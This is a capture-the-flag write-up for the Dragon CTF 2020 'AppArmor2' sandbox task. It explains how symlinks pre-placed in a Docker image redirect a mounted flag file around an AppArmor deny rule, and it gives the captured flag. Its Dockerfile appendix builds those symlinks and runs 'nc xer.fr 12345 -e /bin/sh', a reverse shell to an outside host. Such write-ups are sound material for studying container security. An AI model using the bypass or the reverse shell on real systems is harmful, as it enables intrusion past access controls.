# AppArmor2 - Dragon CTF 2020 (Sandbox, 421p, 7 solved)

## Introduction
AppArmor2 is a sandbox task.

A remote server executes user-provided Docker containers with a specific
AppArmor ruleset which prevents from reading `/flag*`:
```
# The line below (+ profile name, + install comments at bottom) is only difference from the original file
deny /flag* rwklx,
```

The rule prevents (`deny`) the file from being read (`r`), written (`w`), locked
(`k`), linked (`l`) or executed (`x`).

The flag is mounted as `/flag-XXXX` with X being random hexadecimal digits. It
cannot be read because of the AppArmor rule.

## Vulnerability
If the target of a mount operation already exists and is a symbolic link, the
flag will be mounted as the target of this link.

It is possible to create a container that contains a link for possible flag to
redirect it to `/pwned`.

The flag will be mounted as `/pwned`. Since this file is not restricted by the
AppArmor rule, the flag will be readable with a simple `cat /pwned` command.

Creating an image and pushing it to the Gitlab repository is out of the scope of
this write-up.

**Flag**: `DrgnS{4e77cd33ffb0c7802b39303f7452fd90}`

## Appendices
### Dockerfile
```Dockerfile
FROM busybox
RUN printf 'ln -s /pwned /flag-%04x\n' $(seq 65535) | sh
CMD ["nc", "xer.fr", "12345", "-e", "/bin/sh"]
```
